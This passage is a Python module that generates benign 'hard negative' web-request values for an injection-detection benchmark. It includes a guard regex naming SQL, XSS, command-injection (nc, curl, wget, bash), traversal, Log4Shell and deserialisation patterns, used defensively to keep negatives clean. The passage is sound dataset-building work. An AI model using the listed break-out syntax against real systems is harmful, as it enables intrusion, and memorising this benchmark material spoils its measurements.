"""Benign value generators for WebInject2026.

Two leaks in the corpus's history motivate everything in this module.

**v1** drew benign traffic from a 69-character alphabet with no quote, angle
bracket, semicolon, parenthesis or percent sign. Every attack payload therefore
introduced a character that never occurred in benign traffic, and detection
collapsed to a character-class test (char n-gram F1 = 99.99%). v2 fixed that with
the `hard_negative` tier.

**v2.1** fixed the attack side rigorously — 1,494 payload groups, split-disjoint —
but left the benign side generated from ~150 hand-written phrases with a
per-row group id. Measured on the shipped v2.1 CSV: **67.4% of hard-negative test
parameter values appeared verbatim in training**, and 35.2% of hard-negative test
rows had *every* value seen in training. Since the headline metric is TPR at a
0.1% false-positive budget — a number driven entirely by the hardest negatives —
a third of that budget was being spent on memorised strings.

v3 applies the attack-side discipline to the benign side:

  * **Cores.** Punctuation-rich benign text is enumerated by a deterministic
    grammar into ~2,400 distinct *cores*, each with a stable index. Exactly one
    field per hard-negative row carries a core, and the core index is the row's
    split group — so a benign phrase, like an attack payload, lives wholly in one
    split. Test measures generalisation to unseen benign phrasing.
  * **Procedural filler.** Every other field uses a generator that composes from
    parts and splices in a random discriminator (an order number, a token), so
    the value space is effectively unbounded and verbatim reuse cannot occur.
    Short fields (names, streets, cities) that were fixed 8-29 item lists are now
    composed the same way.

`INJECTION_GUARD` enforces the tier boundary: nothing emitted at the
`hard_negative` tier, and no core, may match it. That is what keeps adversarial
negatives from silently becoming mislabelled attacks.
"""

import random
import re
import string
import urllib.parse

# --------------------------------------------------------------- guard ------
# Sequences that constitute an actual break-out rather than merely suspicious
# text. `hard_negative` output matching any of these is a labelling error.
#
# Header-name patterns are deliberately anchored to a preceding newline (raw or
# encoded): a benign request legitimately carries `X-Forwarded-Host:` as a real
# header, and the guard is also run over whole normalised payloads by the gate.
# Only a header name *introduced by an injected newline* is an attack.
INJECTION_GUARD = re.compile(
    r"""(?xi)
    ['"`]\s*(or|and)\s+['"(\d]           # ' OR 1, " AND (
  | \b(union\s+(all\s+)?select)\b
  | \b(select\s+.{0,40}\bfrom\b.{0,40}\b(where|--|\#))
  | (--|\#|/\*)\s*$                      # trailing comment terminator
  | ;\s*(drop|delete|update|insert|truncate|exec|shutdown)\b
  | <\s*(script|img|svg|iframe|body|object|embed|details|marquee)\b
  | \bon(error|load|click|mouseover|focus|toggle)\s*=
  | javascript\s*:
  | \bdata\s*:\s*text/html
  | [;|&]{1,2}\s*(cat|ls|dir|whoami|id|uname|nc|ncat|curl|wget|ping|sleep|bash|sh|powershell|certutil)(?![=\w])
  | (\$\(|`)\s*(cat|ls|dir|whoami|id|uname|nc|ncat|curl|wget|ping|sleep|bash|sh|echo|rm|env|printenv|nslookup)\b
  | (\.\./|\.\.\\){2,}                   # traversal
  | %2e%2e[%2f5c]                        # encoded traversal
  | \{\{[^{}]{0,80}\}\}|\$\{[^{}]{0,80}\}|<%[^%]{0,80}%>   # template injection
  | <!ENTITY|<!DOCTYPE[^>]*ENTITY
  | \$(ne|gt|lt|where|regex|expr)\b      # NoSQL operators
  | \)\s*\(\s*\|\s*                      # LDAP filter break-out
  | %0d%0a
  | (\\r\\n|[\r\n])\s*(set-cookie|location|transfer-encoding|content-length
       |x-forwarded-host|host)\s*:       # CRLF header injection / smuggling
  | \bjndi\s*:\s*(ldap|ldaps|rmi|dns|iiop|corba|nis|nds)   # Log4Shell
  | \$\{[^}]{0,40}jndi
  | __proto__                            # prototype pollution
  | constructor\s*(\[\s*['"]?prototype|\.\s*prototype)
  | \brO0AB[A-Za-z0-9+/=]{6,}            # java serialised stream, base64
  | \bO:\d+:"[^"]{1,40}":\d+:\{          # PHP serialised object
  | !!(python|ruby|java)/object          # YAML deserialisation
  | _\$\$ND_FUNC\$\$_                    # node-serialize RCE
  | \bAAEAAAD/{0,2}[A-Za-z0-9+/]{8,}     # .NET BinaryFormatter, base64
    """,
)


def is_injective(value: str) -> bool:
    """True if `value` contains real injection syntax (not merely punctuation)."""
    return bool(INJECTION_GUARD.search(urllib.parse.unquote_plus(value)))


# ------------------------------------------------------------ word banks ----
FIRST = ["james", "maria", "ana", "carlos", "sophie", "david", "elena", "luis",
         "priya", "wei", "omar", "sara", "nikhil", "anna", "marco", "yuki",
         "hassan", "lena", "pablo", "ravi", "tomas", "ines", "fatima", "noah"]
LAST = ["smith", "garcia", "muller", "rossi", "chen", "patel", "kumar", "silva",
        "novak", "dubois", "ahmed", "kowalski", "nielsen", "tanaka", "okafor",
        "ivanov", "moreau", "costa", "haddad", "berg"]

# Names as they are actually typed. Composed from parts rather than drawn from a
# fixed list, so the value space is large enough that verbatim reuse across
# splits does not happen by accident.
NAME_PARTICLES = ["O'", "D'", "N'", "M'", "Mc", "Mac", "van der ", "van ",
                  "de la ", "de ", "von ", "Al-", "El-", "St. ", "Ó", ""]
NAME_ROOTS = ["Brien", "Neill", "Angelo", "Diaye", "Baye", "Souza", "Rashid",
              "Berg", "Cruz", "Trapp", "Clair", "Donald", "Connor", "Laughlin",
              "Hara", "Sullivan", "Keefe", "Toole", "Shea", "Reilly", "Meara"]
NAME_TAILS = ["", "", "", ", Jr.", ", Sr.", " III", " (Alex)", " (né Weber)",
              "-Marie", "-Luc", "-Kate", "-Ann", " Jr", ", PhD"]
NAME_UNICODE = ["José", "Müller", "Łukasz", "Renée", "Björn", "François",
                "Þórdís", "Zoë", "Chloé", "Ægir", "Søren", "Šimon", "Ayşe",
                "李明", "김민준", "Дмитрий", "أحمد", "Ολυμπία", "নীলিমা"]

CITIES = ["madrid", "london", "berlin", "paris", "rome", "mumbai", "tokyo",
          "lisbon", "vienna", "oslo", "sao paulo", "cape town"]
CITY_STEMS = ["Stoke", "Baden", "Aix", "Val", "Newcastle", "Clermont",
              "Bourg", "Chalons", "Saint", "Bergen", "Alcala", "Vitoria"]
CITY_TAILS = ["-on-Trent", "-en-Provence", "-d'Or", "-upon-Tyne", "-Ferrand",
              "-la-Reine", "-sur-Marne", " (Oder)", ", D.C.", "-Baden",
              "-de-Henares", "-Gasteiz"]
CITY_APOS = ["'s-Hertogenbosch", "St. John's", "Xi'an", "L'Aquila", "N'Djamena",
             "Coeur d'Alene", "Martha's Vineyard", "King's Lynn"]

TERMS = ["apple", "juice", "banana", "gift", "offer", "discount", "organic",
         "fresh", "summer", "premium", "seasonal", "gluten free", "vegan",
         "sugar free", "cold pressed", "family pack"]
PRODUCTS = ["vino rioja", "jamon iberico", "apple juice", "green smoothie",
            "olive oil", "manchego cheese", "dark chocolate", "flower honey",
            "bomba rice", "sweet paprika"]

STREET_NAMES = ["Oak", "Elm", "Main", "High", "Church", "Station", "Park",
                "Mill", "Baker", "Pennsylvania", "Kupfergraben", "Espanya"]
STREET_KINDS = ["Rd", "St.", "Ave.", "Lane", "Way", "Pl.", "Terrace", "Rue",
                "Plaça", "Weg"]
STREET_UNITS = ["Flat 3/2", "Apt. #12", "Building B", "2n 1a", "c/o Reception",
                "Unit 7 (rear)", "P.O. Box 1123", "Bldg. A, Fl. 4"]

COUNTRIES = ["ES", "UK", "DE", "FR", "IN", "US", "JP", "BR", "NG", "PL"]
LANGS = ["en", "es", "de", "fr", "pt", "ja", "en-GB", "pt-BR", "zh-Hans"]

BENIGN_HOSTS = ["www.example.com", "api.example.org", "cdn.example.net",
                "shop.example.co.uk", "status.example.io"]


# ===========================================================================
# Benign cores: the enumerated, groupable half of the hard-negative tier
# ===========================================================================
# Each generator below enumerates template slots in a fixed order (no RNG, like
# payloads._generate) and yields distinct punctuation-rich strings. The index of
# a core in BENIGN_CORES is its stable id; build.py uses that id as the row's
# split group, so a benign phrase never appears in two splits.
#
# Caps are sized so the tier holds a few thousand cores: with 17,000
# hard-negative rows that is ~7 rows per core, enough for a 70/10/20 group split
# to be stable while still leaving every test core unseen in training.

_REVIEW_OPEN = [
    "Arrived on time — packaging was great!",
    "Not bad, but I'd expected more for the price.",
    "5/5 would buy again :)",
    "Tastes exactly like my grandmother's recipe <3",
    "Delivery was late (3 days), otherwise fine.",
    "Great value if you're buying in bulk.",
    "Quality dropped since last year's batch, sadly.",
    "It's 100% organic & the flavour shows.",
    "Compared to Ben & Jerry's this is better value.",
    "Ordered from Côte d'Ivoire — took 3 weeks.",
    "£12.99 seems steep… found it for £9 elsewhere.",
    "My kids love it 😍 but it's a bit sweet for me.",
    "Rating: 4.5/5 — docking half a point for the packaging.",
    "Bought 2 — one was damaged, support replaced it fast.",
    "Works fine with the 250ml bottles; the 1L ones don't fit.",
    "TL;DR: good juice, bad lid.",
    "Would rate 3.5 if I could — rounding up.",
    "Honestly? Better than the \"premium\" line.",
]
_REVIEW_BODY = [
    "The lid doesn't seal properly; juice leaked in my bag.",
    "Note: contains traces of nuts (see label).",
    "Shipping cost > product cost, be careful.",
    "Customer service replied in <2 hours, impressive.",
    "Ingredients: water, sugar*, citric acid (*organic).",
    "The 'family pack' is just 6 singles taped together.",
    "Bottle #4 of 6 was half empty :(",
    "Fits the Ø7cm holder perfectly.",
    "Read the description: it says \"concentrate\", not fresh.",
    "Anyone know if this is FODMAP-friendly?",
    "Use code SAVE20 (expires 31/12) for 20% off.",
    "See https://example.com/reviews?id=44&sort=new for photos.",
    "Temperature must stay < 4°C and > 0°C during transit.",
    "The label says 1L but the bottle measures ~950ml.",
    "Barcode scans as 8-digit; the app wants 13 (EAN-13).",
    "Two of the six had dented caps — refunded, no fuss.",
]
_REVIEW_CLOSE = [
    "Pro tip: refrigerate before opening!",
    "(edited)", "(verified buyer)", "(updated 12/03)",
    "Would recommend — 4/5.",
    "Docking a star for the packaging, not the product.",
    "Will reorder once it's back in stock.",
    "Hope they fix the lid in the next batch.",
    "Support ticket #44821 if anyone from the shop reads this.",
    "Photos attached (see gallery > row 2).",
    "Shipping was free over £25, worth knowing.",
    "Not sponsored, just a happy customer :)",
]

_SEARCH_HEAD = [
    "\"cold pressed\"", "men's", "d'Artagnan", "L'Oréal", "Ben & Jerry's",
    "M&M's", "100% cotton", "3 for 2", "1/2 price", "50% off",
    "café & bakery", "b&b", "AT&T vs T-Mobile", "24\"",
]
_SEARCH_MID = ["juice", "shoes 9.5", "cheese", "shampoo", "family pack",
               "t-shirt", "monitor", "olive oil", "gift set", "breakfast",
               "smoothie", "chocolate (dark)", "rice 1kg", "paprika, sweet"]
_SEARCH_TAIL = [
    "under $20", "(mix & match)", "incl. VAT", "— free shipping",
    "size < 10cm", "in stock?", "near me", "[organic]", "> 500ml",
    "ships to Côte d'Ivoire", "price: 12,50 €", "ISO 8601 (YYYY-MM-DD)",
]
_SEARCH_DEV = [
    "why is a > b false?", "x = y + 1 meaning", "difference between JOIN and LEFT JOIN",
    "regex for [a-z]+ match", "escape & in xml", "convert <b> to markdown",
    "using -- in css variables", "npm install --save-dev",
    "git reset --hard explained", "how to use % in SQL LIKE",
    "what is || in javascript", "array[0] vs array.at(0)",
    "if (a && b) then", "COUNT(*) performance", "printf(\"%s\") example",
    "what does &nbsp; do", "meaning of ?: in typescript",
    "when to use $() in shell scripts",
]

_CODE_TPL = [
    "for (let {i} = 0; {i} < {n}; {i}++) {{ {acc} += {i}; }}",
    "if ({a} && {b}) {{ return {a} * {b}; }} else {{ return 0; }}",
    "const {acc} = {arr}.map(v => v.trim()).filter(Boolean);",
    "{acc} = [x for x in {arr} if x.get('{k}')]",
    "SELECT {k}, price FROM products ORDER BY price DESC LIMIT {n}",
    "df = df[df.{k} > {n}].sort_values('{k}')",
    "curl -H \"Accept: application/json\" /api/{k}?limit={n}",
    "{{\"{k}\": {n}, \"tags\": [\"fresh\", \"organic\"]}}",
    "printf(\"%d items, %.2f total\\n\", {n}, {acc});",
    "git log --oneline --since='{n} weeks ago' -- {k}/",
    "grep -rn \"{k}\" ./config | head -{n}",
    "error: cannot read property '{k}' of undefined",
    "Traceback: KeyError: '{k}' at line {n}",
    "expected 200, got 500 (Internal Server Error) on /{k}",
    "docker run -p {n}:{n} --rm shop:latest",
    "SET @total = (SELECT SUM(qty) FROM basket) -- {n} rows",
    "{a} = {b} ? {acc} : 0; // ternary",
    "path = os.path.join('data', '{k}.csv')",
    "assert {arr}.length === {n}, 'unexpected {k} count';",
    "logger.warn(`{k} took ${{ms}}ms (> {n}ms budget)`);",
]
_CODE_IDENT = ["basketId", "orderRef", "customer", "sku", "qty", "total",
               "productId", "locale"]
_CODE_N = ["3", "10", "12", "42", "100", "3000"]

# Benign text carrying the *same encoding markers the evasion transforms
# introduce* — %25, /**/, &#NN;, %3C/%3E/%27, %09/%0a, %00. Without these on the
# benign side an evasion marker is a free label signal and encoded attacks become
# *easier* to spot than plain ones. The `evasion_artifact` gate asserts every
# marker also appears here.
_ENC_TPL = [
    "the CSS reset uses {m} before each rule block",
    "in the export, {m} is left in the raw text on purpose",
    "wrote a {m} no-op to keep the minifier from merging lines",
    "the link came through double-encoded as {m} in the log",
    "our redirect param arrives as {m} sometimes, is that normal?",
    "search box put {m} in the URL after the form submit",
    "tab-separated export encodes the gap as {m} between columns",
    "the textarea newline shows up as {m} in the raw POST body",
    "upload failed: the filename had a stray {m} in it",
    "he pasted {m} into the ticket and the renderer ate it",
    "config diff: the value changed to {m} inline",
    "the tracking URL was {m} encoded end to end, weird",
    "log line shows the field truncated at {m} — client bug?",
    "docs say to write {m} when the value contains a separator",
]
_ENC_MARK = [
    "/* comment */", "/**/", "&amp; and &#39;", "&#60;b&#62;bold&#60;/b&#62;",
    "&#8364;", "%252Fproducts%252Fnew", "ref%3Dnews%26page%3D2",
    "report%2520final.pdf (note the %25)", "%3Cbrand%3E", "%09", "%0a",
    "%00", "%68%74%74%70", "&lt;div class=&quot;card&quot;&gt;", "a/*old*/",
]
_ENC_CTX = ["", " — reported by two customers", " (see attached screenshot)",
            ", reproduced on staging"]

_QA_HEAD = [
    "quick question:", "support ticket follow-up:", "hi team,", "bug report:",
    "feature request:", "re: yesterday's call —", "reopening #4471:",
    "for the docs:", "asked in the forum:", "escalating this:",
    "FYI (low priority):", "from the retro:",
]
_QA_BODY = [
    "the checkout total shows 12,50 € but the invoice says £12.50",
    "why does the CSV export wrap every field in \"double quotes\"?",
    "the 'remember me' box unticks itself after ~30 min",
    "can we get the API to return 404 instead of 200 + empty body?",
    "the search box drops the & when I type \"salt & pepper\"",
    "our SSO redirect loses the ?next= parameter on mobile",
    "pagination breaks past page 50 (off-by-one?)",
    "the date picker accepts 31/02 without complaining",
    "prices > 1000 render as 1.000 in the German locale",
    "is the rate limit per-IP or per-token? docs don't say",
    "the PDF invoice shows the customer's name as ??? for non-ASCII",
    "attachments over 5MB fail silently — no error toast",
    "the <select> resets when the form fails validation",
    "session expires mid-upload and we lose the whole file",
]
_QA_TAIL = ["", " Thanks!", " — happy to test a fix.", " No rush.",
            " Repro steps attached.", " Affects ~3% of orders.",
            " Let me know if you need the HAR file."]

_MARKUP_TPL = [
    "**Important:** the 250ml & 1L bottles differ (see table > row {n}).",
    "Use &amp; instead of & in the XML export, and &lt;br&gt; for line breaks.",
    "I rated it 4/5 — the app shows it as {n}%, which is fine.",
    "See [our FAQ](https://example.com/faq?id={n}) — it answers this.",
    "`{k}` is the column you want; `{k}_id` is the foreign key.",
    "> quoting the spec: \"the {k} field MUST be present\" (RFC {n})",
    "| {k} | qty | price |\\n|---|---|---|\\n| oil | {n} | 4,20 € |",
    "1. open /settings\\n2. toggle `{k}`\\n3. save (Ctrl+S)",
    "~~deprecated~~ use `{k}` instead — see changelog v{n}.0",
    "<p>My order number is {n}</p> renders wrong in the email client",
    "the icon is &#9888; (warning) not &#10060; (cross)",
    "wrap inline code in `backticks` like the `README` for {k} shows",
]
_MARKUP_K = ["basketId", "orderRef", "sku", "locale", "total", "customer_ref"]
_MARKUP_N = ["2", "3", "7", "12", "80", "4471"]

_LOG_TPL = [
    "npm ERR! code E404 — {k} not found in registry",
    "WARN [{k}] retry 2/3 after 500 (upstream timeout {n}ms)",
    "GET /api/{k}?limit={n} 200 in {n}ms",
    "psql: FATAL: database \"{k}\" does not exist",
    "nginx: [warn] client sent invalid header while reading /{k}",
    "java.lang.IllegalArgumentException: bad {k} (expected > {n})",
    "E/AndroidRuntime: at com.shop.{k}.load(Unknown Source:{n})",
    "ssl: certificate for *.example.com expires in {n} days",
    "cron: /usr/local/bin/sync-{k} exited 0 after {n}s",
    "smtp: 550 5.1.1 <{k}@example.com>: recipient rejected",
    "redis: OOM command not allowed, maxmemory {n}mb reached",
    "kernel: memory pressure — {k} rss={n}mb, throttling",
]
_LOG_K = ["orders", "basket", "catalog", "invoices", "sessions", "webhooks"]
_LOG_N = ["5", "30", "120", "512", "2000", "4471"]

# Cap per generator: total ~2,400 cores.
_CORE_CAPS = {"review": 520, "search": 420, "code": 380, "encoded": 300,
              "qa": 320, "markup": 220, "log": 260}


def _gen_review():
    for o in _REVIEW_OPEN:
        for b in _REVIEW_BODY:
            for c in _REVIEW_CLOSE:
                yield f"{o} {b} {c}"


def _gen_search():
    for h in _SEARCH_HEAD:
        for m in _SEARCH_MID:
            for t in _SEARCH_TAIL:
                yield f"{h} {m} {t}"
    for d in _SEARCH_DEV:
        for t in _SEARCH_TAIL:
            yield f"{d} {t}"


def _gen_code():
    for tpl in _CODE_TPL:
        for k in _CODE_IDENT:
            for n in _CODE_N:
                yield tpl.format(i="i", n=n, acc="total", a="a", b="b",
                                 arr="items", k=k)


def _gen_encoded():
    for tpl in _ENC_TPL:
        for m in _ENC_MARK:
            for c in _ENC_CTX:
                yield tpl.format(m=m) + c


def _gen_qa():
    for h in _QA_HEAD:
        for b in _QA_BODY:
            for t in _QA_TAIL:
                yield f"{h} {b}{t}"


def _gen_markup():
    for tpl in _MARKUP_TPL:
        for k in _MARKUP_K:
            for n in _MARKUP_N:
                yield tpl.format(k=k, n=n)


def _gen_log():
    for tpl in _LOG_TPL:
        for k in _LOG_K:
            for n in _LOG_N:
                yield tpl.format(k=k, n=n)


_CORE_GENERATORS = {
    "review": _gen_review, "search": _gen_search, "code": _gen_code,
    "encoded": _gen_encoded, "qa": _gen_qa, "markup": _gen_markup,
    "log": _gen_log,
}


def _build_cores():
    """Enumerate benign cores in fixed order; drop any that trip the guard.

    Filtering here rather than at emit time is what lets the gate assert *zero*
    hard negatives contain injection syntax without a retry loop that would
    perturb the core -> group mapping.
    """
    cores, kinds, seen = [], [], set()
    for kind, gen in _CORE_GENERATORS.items():
        cap = _CORE_CAPS[kind]
        n = 0
        for text in gen():
            if n >= cap:
                break
            t = re.sub(r"\s+", " ", text).strip()
            if not t or t in seen or is_injective(t):
                continue
            seen.add(t)
            cores.append(t)
            kinds.append(kind)
            n += 1
    return cores, kinds


BENIGN_CORES, BENIGN_CORE_KINDS = _build_cores()


def core_value(rng: random.Random):
    """Return (text, core_id) for the one groupable field of a hard negative.

    `core_id` is the row's split group. Every occurrence of a core therefore
    lands in a single split, so a benign phrase in the test set was never seen
    during training — the benign mirror of the payload-disjoint attack split.
    """
    i = rng.randrange(len(BENIGN_CORES))
    return BENIGN_CORES[i], f"benH-{i:05d}"


# --------------------------------------------------------- primitives -------
def _digits(rng, n=6):
    return "".join(rng.choices(string.digits, k=n))


def _words(rng, k=None, bank=None):
    bank = bank or (TERMS + PRODUCTS + FIRST + CITIES)
    k = k or rng.randint(3, 10)
    return " ".join(rng.choice(bank) for _ in range(k))


def _discriminator(rng):
    """A short, near-unique tail spliced into procedural free text.

    This is what makes non-carrier benign values unbounded: two rows never emit
    the same string, so only the *core* — which is grouped and split-disjoint —
    can repeat.
    """
    return rng.choice([
        f"Order #{_digits(rng, 6)}.",
        f"(ref {rng.choice(string.ascii_uppercase)}{_digits(rng, 5)})",
        f"[ticket-{_digits(rng, 5)}]",
        f"— seen {rng.randint(2, 90)}x this week",
        f"case {_digits(rng, 4)}/{rng.randint(20, 26)}",
        f"batch {rng.choice('ABCDEF')}-{_digits(rng, 4)}",
    ])


def procedural_text(rng):
    """Unbounded punctuation-rich free text for NON-carrier fields.

    Structurally distinct from the cores (always two fragments plus a
    discriminator), so it cannot accidentally reproduce a core verbatim.
    """
    a = rng.choice(_REVIEW_OPEN + _QA_BODY)
    b = rng.choice(_REVIEW_BODY + _SEARCH_DEV + _LOG_K)
    return f"{a} {b} {_discriminator(rng)}"


def procedural_query(rng):
    """Unbounded punctuation-rich search text for NON-carrier fields."""
    return (f"{rng.choice(_SEARCH_HEAD)} {rng.choice(_SEARCH_MID)} "
            f"{rng.choice(_SEARCH_TAIL)} #{_digits(rng, 4)}")


# ------------------------------------------------------------ fields --------
def _punct_name(rng):
    r = rng.random()
    if r < 0.25:
        return rng.choice(NAME_UNICODE) + rng.choice(NAME_TAILS)
    if r < 0.4:
        return (f"{rng.choice(NAME_UNICODE)} \"{rng.choice(FIRST).title()}\" "
                f"{rng.choice(NAME_ROOTS)}")
    return (f"{rng.choice(NAME_PARTICLES)}{rng.choice(NAME_ROOTS)}"
            f"{rng.choice(NAME_TAILS)}")


def person_name(rng, tier):
    if tier == "routine":
        return f"{rng.choice(FIRST)}.{rng.choice(LAST)}{rng.randint(1, 999)}"
    return _punct_name(rng)


def username(rng, tier):
    if tier == "routine":
        return f"{rng.choice(FIRST)}.{rng.choice(LAST)}{rng.randint(1, 999)}"
    style = rng.random()
    if style < 0.35:
        return f"{rng.choice(FIRST)}_{rng.choice(LAST)}+{rng.randint(1, 999)}"
    if style < 0.6:
        return _punct_name(rng).lower().replace(" ", ".")
    return (f"{rng.choice(FIRST)}.{rng.choice(LAST)}{rng.randint(1, 99)}"
            f"@{rng.choice(['corp', 'eu', 'dev'])}")


def email(rng, tier):
    if tier == "routine":
        return f"{rng.choice(FIRST)}.{rng.choice(LAST)}{rng.randint(1, 999)}@mail.com"
    local = rng.choice([
        f"{rng.choice(FIRST)}+shop{rng.randint(1, 999)}",
        f"{rng.choice(FIRST)}.{rng.choice(LAST)}{rng.randint(1, 99)}",
        f"\"{rng.choice(FIRST)} {rng.choice(LAST)}{rng.randint(1, 99)}\"",
        f"{rng.choice(FIRST)}_{rng.choice(LAST)}-{rng.randint(1, 999)}",
    ])
    return f"{local}@{rng.choice(['mail.com', 'example.co.uk', 'post.example.org'])}"


def password(rng, tier):
    """Real passwords are the densest benign source of shell metacharacters."""
    if tier == "routine":
        return "".join(rng.choices(string.ascii_letters + string.digits,
                                   k=rng.randint(10, 20)))
    sym = "!@#$%^&*()_+-=[]{};:,.?~"
    return "".join(rng.choices(string.ascii_letters + string.digits + sym,
                               k=rng.randint(12, 24)))


def token(rng, tier):
    if tier == "routine":
        return _digits(rng, rng.randint(8, 12))
    kind = rng.random()
    if kind < 0.4:  # JWT-shaped
        seg = lambda n: "".join(rng.choices(
            string.ascii_letters + string.digits + "-_", k=n))
        return f"eyJ{seg(14)}.{seg(rng.randint(20, 40))}.{seg(22)}"
    if kind < 0.7:  # base64 with padding
        raw = "".join(rng.choices(string.ascii_letters + string.digits + "+/",
                                  k=rng.randint(16, 32)))
        return raw + "=" * rng.randint(0, 2)
    return f"{_digits(rng, 8)}-{_digits(rng, 4)}-{_digits(rng, 4)}"


def session_id(rng, tier):
    return _digits(rng, 8) if tier == "routine" else token(rng, tier)


def search_query(rng, tier):
    if tier == "routine":
        return _words(rng, rng.randint(2, 7))
    return procedural_query(rng)


def free_text(rng, tier):
    if tier == "routine":
        return _words(rng, rng.randint(5, 16))
    return procedural_text(rng)


def filename(rng, tier):
    if tier == "routine":
        return f"report_{_digits(rng, 5)}.pdf"
    stem = rng.choice([
        f"Q{rng.randint(1, 4)} report (final) v{rng.randint(1, 9)}",
        f"facture_client_#{_digits(rng, 4)}",
        f"résumé-{rng.randint(2019, 2026)}",
        f"invoice {rng.randint(2019, 2026)}-{rng.randint(1, 12):02d}-11",
        f"notes [draft {rng.randint(1, 9)}]",
        f"order&receipt_{_digits(rng, 3)}",
        f"photo ({rng.randint(1, 40)})",
    ])
    return f"{stem}.{rng.choice(['pdf', 'docx', 'csv', 'png', 'xlsx'])}"


def page_ref(rng, tier):
    """Values for include/template parameters - benign relative resource names."""
    if tier == "routine":
        return rng.choice(["include", "home", "about", "contact", "help"]) + ".php"
    seg = rng.choice(["pages", "content", "templates/en", "docs/api/v2",
                      "modules/cart", "static/legal"])
    leaf = rng.choice(["help.php", "about.php", "home.tpl", "users.json",
                       "summary.inc", "terms-v3.html", "faq.php"])
    tail = rng.choice(["", f"?section={rng.randint(1, 9)}", "#top",
                       f"?v={rng.randint(2, 9)}"])
    return f"{seg}/{leaf}{tail}"


def url_value(rng, tier):
    if tier == "routine":
        return "/account/orders"
    host = rng.choice(BENIGN_HOSTS)
    r = rng.random()
    if r < 0.4:
        return f"https://{host}/cart?item={_digits(rng, 3)}&ref=news%2Ffeed#top"
    if r < 0.7:
        return urllib.parse.quote(
            f"https://{host}/checkout?step={rng.randint(1, 4)}&promo=SAVE20", safe="")
    return (f"/products/{_digits(rng, 3)}?utm_source=news&utm_medium=email"
            f"&r={rng.randint(1, 9)}")


def field_list(rng, tier):
    base = ["name", "price", "description", "rating", "stock", "sku"]
    k = rng.randint(2, 4)
    if tier == "routine":
        return ",".join(rng.sample(base, k))
    return rng.choice([
        ",".join(rng.sample(base, k)),
        f"{{{','.join(rng.sample(base, k))}}}",
        f"[{','.join(rng.sample(base, k))}]",
        f"{rng.choice(base)}:asc,{rng.choice(base)}:desc",
    ])


def ip_or_host(rng, tier):
    if tier == "routine":
        return f"{rng.randint(1, 254)}.{rng.randint(0, 254)}." \
               f"{rng.randint(0, 254)}.{rng.randint(1, 254)}"
    r = rng.random()
    if r < 0.35:
        return rng.choice(BENIGN_HOSTS)
    if r < 0.6:
        return f"{rng.choice(BENIGN_HOSTS)}:{rng.choice([80, 443, 8443])}"
    if r < 0.8:
        return f"2001:db8::{rng.randint(1, 65535):x}"
    return f"{rng.choice(BENIGN_HOSTS)}/health?verbose=1&t={_digits(rng, 4)}"


def city(rng, tier):
    if tier == "routine":
        return rng.choice(CITIES)
    if rng.random() < 0.35:
        return rng.choice(CITY_APOS)
    return rng.choice(CITY_STEMS) + rng.choice(CITY_TAILS)


def street(rng, tier):
    if tier == "routine":
        return f"{rng.choice(STREET_NAMES).lower()} {rng.randint(1, 300)}"
    return (f"{rng.randint(1, 400)}{rng.choice(['', 'a', 'b', ' bis'])} "
            f"{rng.choice(STREET_NAMES)} {rng.choice(STREET_KINDS)}, "
            f"{rng.choice(STREET_UNITS)}")


def postcode(rng, tier):
    if tier == "routine":
        return _digits(rng, 5)
    return rng.choice([
        f"SW{rng.randint(1, 20)}A {rng.randint(1, 9)}AA",
        f"{rng.randint(75000, 75999)}",
        f"E{rng.randint(1, 20)}W {rng.randint(1, 9)}SS",
        f"{rng.randint(1000, 9999)}-{_digits(rng, 3)}",
        f"K{rng.randint(1, 9)}A {rng.randint(0, 9)}B{rng.randint(0, 9)}",
    ])


def order_id(rng, tier):
    if tier == "routine":
        return f"ord-{_digits(rng, 6)}"
    return rng.choice([
        f"ORD/{rng.randint(2020, 2026)}/{_digits(rng, 5)}",
        f"ord-{_digits(rng, 4)}-r{rng.randint(1, 3)}",
        f"#{_digits(rng, 7)}",
    ])


# ----------------------------------------------------------- dispatch -------
_SIMPLE = {
    "person_name": person_name, "username": username, "email": email,
    "password": password, "token": token, "session_id": session_id,
    "search_query": search_query, "free_text": free_text, "filename": filename,
    "page_ref": page_ref, "url_value": url_value, "field_list": field_list,
    "ip_or_host": ip_or_host, "city": city, "street": street,
    "postcode": postcode, "order_id": order_id,
}


def value_for(field_type: str, rng: random.Random, tier: str) -> str:
    """Produce one benign value for a declared field type at a given tier.

    Never returns a core: cores are emitted only through `core_value()`, for the
    single carrier field of a hard-negative row, so that exactly one groupable
    string exists per row and the group is unambiguous.
    """
    if field_type.startswith("const:"):
        return field_type.split(":", 1)[1]
    if field_type.startswith("enum:"):
        return rng.choice(field_type.split(":", 1)[1].split("|"))
    if field_type in _SIMPLE:
        v = _SIMPLE[field_type](rng, tier)
    elif field_type == "int_id":
        v = str(rng.randint(1, 5000))
    elif field_type == "int_small":
        v = str(rng.choice([5, 10, 20, 25, 50, 100, 1000, 5000, 100000]))
    elif field_type == "int_tiny":
        v = str(rng.randint(1, 5))
    elif field_type == "digits":
        v = _digits(rng, rng.randint(8, 12))
    elif field_type == "lang_code":
        v = rng.choice(LANGS)
    elif field_type == "country_code":
        v = rng.choice(COUNTRIES)
    else:
        raise KeyError(f"unknown field type: {field_type}")

    # Tier contract: adversarial negatives must never be real injections.
    if tier == "hard_negative" and is_injective(v):
        return value_for(field_type, rng, "routine")
    return v


# =========================================================== ambiguous ======
# Benign-in-context text that *contains literal attack syntax*. This is the
# irreducible error floor of payload-only detection: a detector that flags these
# is flagging people *talking about* attacks.
#
# Built compositionally (frame x specimen) with a stable core id, and the split
# is core-disjoint, so the floor is measured on frames/specimens never seen in
# training.
#
#   discussion — long, benign-dominant text quoting a payload. A context-aware
#                model can classify these correctly, so they leave *headroom*.
#   verbatim   — minimal framing, so the request is *dominated* by attack syntax.
#                No request-only detector can separate these from a real attack;
#                they are the irreducible floor. Tagged so the headline metric
#                can be reported with and without them.
AMBIGUOUS_FRAMES_DISCUSSION = [
    "how do I stop {x} from working on my login form?",
    "our scanner flagged {x} in this field, is that a real risk?",
    "reading about {x} for my dissertation, any good sources?",
    "the tutorial says to test with {x} — is that safe to try?",
    "what does {x} actually do under the hood?",
    "studying {x} bypasses for my security course",
    "found {x} in the access logs, should I be worried?",
    "OWASP lists {x} as a classic test vector",
    "can someone explain why {x} works?",
    "my professor demoed {x} in the lecture today",
    "the CTF hint just said {x}, no idea what to do with it",
    "is {x} something the WAF should already block?",
    "blog draft: preventing {x} in legacy PHP apps",
    "quick question — does {x} count as a stored or reflected issue?",
    "pen-test report flagged {x}; how do we remediate it?",
    "why does the linter warn about {x} here?",
    "saw {x} in a writeup and wanted to understand it",
